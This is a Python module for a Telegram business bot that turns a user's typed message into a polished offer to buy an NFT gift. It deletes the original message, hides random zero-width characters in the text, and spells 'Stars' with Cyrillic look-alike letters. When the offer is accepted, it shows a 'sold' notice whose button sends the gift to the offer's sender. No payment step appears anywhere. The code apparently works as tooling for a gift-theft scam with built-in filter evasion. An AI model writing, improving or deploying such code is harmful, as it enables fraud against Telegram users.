import html
import logging
import random
import re
import time
from urllib.parse import urlparse

from config import OFFER_DURATION, ADMIN_ID
from database import db
from business_helpers import send, edit, delete_message, answer_callback
from gift_parser import sync_fetch_nfts
from texts import t

log = logging.getLogger(__name__)

_last_offer_at = 0.0
OFFER_COOLDOWN = 0.8

EMOJI_STAR  = "5848021027782661221"
EMOJI_GIFT  = "5875180111744995604"
EMOJI_GRAM  = "5778546023349621090"
EMOJI_CHECK = "5776375003280838798"
EMOJI_CROSS = "5778527486270770928"

ZW = ["\u200b", "\u200c", "\u200d", "\u2060", "\ufeff"]


def _wait_cooldown():
    global _last_offer_at
    wait = OFFER_COOLDOWN - (time.monotonic() - _last_offer_at)
    if wait > 0:
        time.sleep(wait)
    _last_offer_at = time.monotonic()


def escape(v):
    return html.escape(str(v), quote=True)


def obfuscate(text: str) -> str:
    """Мягкая обфускация: невидимые символы редко, только между буквами.
    Не трогает HTML-теги, @username, ссылки, цифры."""
    out = []
    i = 0
    n = len(text)
    in_tag = False

    while i < n:
        ch = text[i]

        if ch == "<":
            in_tag = True
            out.append(ch); i += 1; continue
        if ch == ">":
            in_tag = False
            out.append(ch); i += 1; continue
        if in_tag:
            out.append(ch); i += 1; continue

        if ch == "@":
            j = i + 1
            while j < n and (text[j].isalnum() or text[j] == "_"):
                j += 1
            out.append(text[i:j]); i = j; continue

        if text.startswith(("http://", "https://", "tg://"), i):
            j = i
            while j < n and not text[j].isspace() and text[j] not in "<>":
                j += 1
            out.append(text[i:j]); i = j; continue

        if ch.isdigit():
            out.append(ch); i += 1; continue

        out.append(ch)
        if (ch.isalpha() and i + 1 < n and text[i + 1].isalpha()
                and random.random() < 0.08):
            out.append(random.choice(ZW))
        i += 1

    return "".join(out)


def humanize_remaining(expires_at):
    left = max(0, expires_at - 60 - int(time.time()))
    if left <= 0:
        return "0м"
    h, m = divmod(left // 60, 60)
    if h:
        return f"{h}ч {m:02d}м"
    return f"{m}м"


def star_emoji():
    return f'<tg-emoji emoji-id="{EMOJI_STAR}">🌟</tg-emoji>'


def gift_emoji():
    return f'<tg-emoji emoji-id="{EMOJI_GIFT}">🎁</tg-emoji>'


def gram_emoji():
    return f'<tg-emoji emoji-id="{EMOJI_GRAM}">💎</tg-emoji>'


def cur_html(currency: str) -> str:
    if currency == "gram":
        return f"{gram_emoji()} Gram"
    return f"{star_emoji()} Ѕtarѕ"


def cur_plain(currency: str) -> str:
    """Для alert — без tg-emoji."""
    return "Gram" if currency == "gram" else "Ѕtarѕ"


def build_offer_text(sender_name, nft_name, nft_num, nft_url,
                     amount, currency, lang, expires_at):
    nft_part = f'<a href="{escape(nft_url)}"><b>{escape(nft_name)} #{escape(nft_num)}</b></a>'
    raw = t(lang, "offer").format(
        name=f"<b>{escape(sender_name)}</b>",
        amount=f"<b>{amount:,}</b>",
        cur=cur_html(currency),
        link=nft_part,
        time=humanize_remaining(expires_at),
    )
    return obfuscate(raw)


def offer_keyboard(key, lang="ru"):
    return {"inline_keyboard": [[
        {"text": t(lang, "btn_decline"), "callback_data": f"decline:{key}",
         "icon_custom_emoji_id": EMOJI_CROSS},
        {"text": t(lang, "btn_accept"), "callback_data": f"accept:{key}",
         "icon_custom_emoji_id": EMOJI_CHECK},
    ]]}


def _save_offer(key, nft_name, nft_num, nft_url, amount, currency, lang,
                chat_id, message_id, business_id, expires_at,
                sender_id, sender_name, sender_username):
    with db() as conn:
        conn.execute("""INSERT INTO offers
            (offer_key, nft_name, nft_num, nft_url, amount, currency, lang,
             chat_id, message_id, business_id, expires_at, sender_id,
             sender_name, sender_username, status, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending', ?)""",
            (key, nft_name, nft_num, nft_url, amount, currency, lang,
             chat_id, message_id, business_id, expires_at,
             sender_id, sender_name, sender_username, int(time.time())))


def _get_offer(key):
    with db() as conn:
        return conn.execute("SELECT * FROM offers WHERE offer_key=?", (key,)).fetchone()


def _send_offer(chat_id, sender_name, nft_name, nft_num, nft_url,
                amount, currency, keyboard, business_id, lang, expires_at):
    log.info("SEND: lang=%s chat=%s biz=%s", lang, chat_id, business_id)
    text = build_offer_text(sender_name, nft_name, nft_num, nft_url,
                            amount, currency, lang, expires_at)
    result = send(chat_id, text, keyboard,
                  business_id=business_id, preview_url=nft_url)
    if not result.get("ok"):
        desc = result.get("description", "")
        log.error("Send failed: %s | chat=%s biz=%s lang=%s",
                  desc, chat_id, business_id, lang)
        if "BUSINESS_PEER_USAGE_MISSING" in desc:
            send(chat_id, "⚠️ Нельзя ответить: клиент не писал за последние 24 часа.",
                 business_id=business_id)
        elif "BUSINESS_CONNECTION_INVALID" in desc:
            send(chat_id, "⚠️ Business connection устарел. Переподключите бота.",
                 business_id=business_id)
        elif "CHAT_WRITE_FORBIDDEN" in desc or "not enough rights" in desc:
            send(chat_id, "⚠️ Нет прав на отправку.",
                 business_id=business_id)
        elif "PEER_FLOOD" in desc:
            send(chat_id, "⚠️ Telegram временно ограничил отправку. Подождите.",
                 business_id=business_id)
        return None
    return result["result"]["message_id"]


def _parse_offer_message(text):
    m_url = re.search(r'(?:https?://)?t\.me/nft/([A-Za-z0-9]+)-(\d+)', text)
    if not m_url:
        return None
    rest = text[m_url.end():]
    m_amount = re.search(r'(\d[\d\s,_]*)', rest)
    if not m_amount:
        return None
    raw_name, raw_num = m_url.group(1), m_url.group(2)
    nft_name = re.sub(r"(?<=[a-z])(?=[A-Z])", " ", raw_name)
    nft_num = f"{int(raw_num):,}"
    nft_url = f"https://t.me/nft/{raw_name}-{raw_num}"
    try:
        amount = int(re.sub(r"[\s,_]", "", m_amount.group(1)))
    except ValueError:
        return None
    if amount <= 0:
        return None
    currency = "star"
    lang = "ru"
    tail = rest[m_amount.end():].strip().upper()
    if "GRAM" in tail or "ГРАМ" in tail:
        currency = "gram"
        tail = tail.replace("GRAM", "").replace("ГРАМ", "").strip()
    elif "STAR" in tail or "ЗВЕЗД" in tail:
        currency = "star"
        tail = tail.replace("STAR", "").replace("ЗВЕЗД", "").strip()
    if tail[:2] in ("EN", "AR", "CN", "RU"):
        lang = tail[:2].lower()
    return nft_name, nft_num, nft_url, amount, currency, lang


def handle_offer_message(msg, business_id=None):
    text = (msg.get("text") or "").strip()
    if not text:
        return False
    parsed = _parse_offer_message(text)
    if not parsed:
        return False
    sender = msg["from"]
    chat_id = msg["chat"]["id"]
    msg_id = msg["message_id"]
    sender_id = int(sender["id"])
    sender_name = sender.get("first_name") or sender.get("username") or "User"
    username = sender.get("username")
    nft_name, nft_num, nft_url, amount, currency, lang = parsed
    log.info("OFFER parsed: nft=%s #%s amount=%s %s lang=%s user=%s",
             nft_name, nft_num, amount, currency, lang, username)
    _wait_cooldown()
    delete_message(chat_id, msg_id, business_id=business_id)
    key = f"{chat_id}_{msg_id}_{int(time.time())}"
    expires_at = int(time.time()) + OFFER_DURATION
    kb = offer_keyboard(key, lang)
    message_id = _send_offer(chat_id, sender_name, nft_name, nft_num, nft_url,
                             amount, currency, kb, business_id, lang, expires_at)
    if not message_id:
        return True
    _save_offer(key, nft_name, nft_num, nft_url, amount, currency, lang,
                chat_id, message_id, business_id, expires_at,
                sender_id, sender_name, username)
    log.info("Offer created: %s | %s #%s | %s %s | lang=%s",
             key, nft_name, nft_num, amount, currency, lang)
    return True


def build_sold_text(nft_name, nft_num, nft_url, amount, currency, lang):
    nft_link = f'<a href="{escape(nft_url)}"><b>{escape(nft_name)} #{escape(nft_num)}</b></a>'
    raw = t(lang, "sold_new").format(
        gift=gift_emoji(),
        link=nft_link,
        cur=cur_html(currency),
    )
    return obfuscate(raw)


def handle_offer_callback(callback):
    data = callback.get("data", "")
    if not (data.startswith("accept:") or data.startswith("decline:")):
        return False
    action, key = data.split(":", 1)
    actor_id = int(callback["from"]["id"])
    cb_id = callback["id"]
    offer = _get_offer(key)
    if not offer:
        answer_callback(cb_id)
        return True
    if int(time.time()) > offer["expires_at"] and offer["status"] == "pending":
        with db() as conn:
            conn.execute("UPDATE offers SET status='expired' WHERE offer_key=?", (key,))
        answer_callback(cb_id, "Время оффера истекло.", alert=True)
        return True
    lang = offer["lang"] or "ru"
    currency = offer["currency"]
    nft_display = f'{offer["nft_name"]} #{offer["nft_num"]}'

    if action == "accept":
        alert_text = t(lang, "accept_alert").format(
            nft=nft_display,
            amount=f'{offer["amount"]:,}',
            cur=cur_plain(currency),
        )
        answer_callback(cb_id, alert_text, alert=True)
        new_text = build_sold_text(offer["nft_name"], offer["nft_num"],
                                   offer["nft_url"], offer["amount"],
                                   currency, lang)
        new_kb = {"inline_keyboard": [[{
            "text": t(lang, "btn_transfer"),
            "url": f"tg://send_gift?to={offer['sender_id']}",
        }]]}
        if offer["message_id"]:
            edit(offer["chat_id"], offer["message_id"], new_text, new_kb,
                 business_id=offer["business_id"],
                 preview_url=offer["nft_url"])
        if offer["status"] == "pending":
            with db() as conn:
                conn.execute("UPDATE offers SET status='accepted' "
                             "WHERE offer_key=? AND status='pending'", (key,))
        return True

    if offer["status"] == "pending":
        with db() as conn:
            conn.execute("UPDATE offers SET status='declined' "
                         "WHERE offer_key=? AND status='pending'", (key,))
        answer_callback(cb_id, t(lang, "declined"), alert=True)
        if offer["message_id"]:
            edit(offer["chat_id"], offer["message_id"],
                 t(lang, "declined"), None, business_id=offer["business_id"])
    else:
        answer_callback(cb_id)
    return True